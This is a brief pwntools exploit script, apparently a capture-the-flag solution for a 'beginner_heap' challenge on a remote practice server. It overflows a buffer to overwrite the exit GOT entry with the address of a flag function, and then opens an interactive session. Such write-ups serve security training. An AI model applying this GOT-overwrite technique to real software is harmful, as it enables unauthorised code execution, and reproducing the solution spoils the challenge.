from pwn import *

flag=0x400826
r=remote("ctf.j0n9hyun.xyz",3016)
b=ELF("./beginner_heap.bin")

pay1='x'*40
pay1+=p64(b.got['exit'])

pay2=p64(flag)

r.sendline(pay1)
r.sendline(pay2)

r.interactive()
